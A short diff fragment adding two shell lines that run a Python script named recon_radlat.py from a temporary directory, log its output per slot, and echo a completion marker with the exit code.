+          python3 /var/tmp/i130radlat/recon_radlat.py 2>&1 | tee /var/tmp/i130radlat/recon_slot$SLOT.log | tail -c 200000
+          echo "I130RADLAT_EXIT_DONE rc=$?"
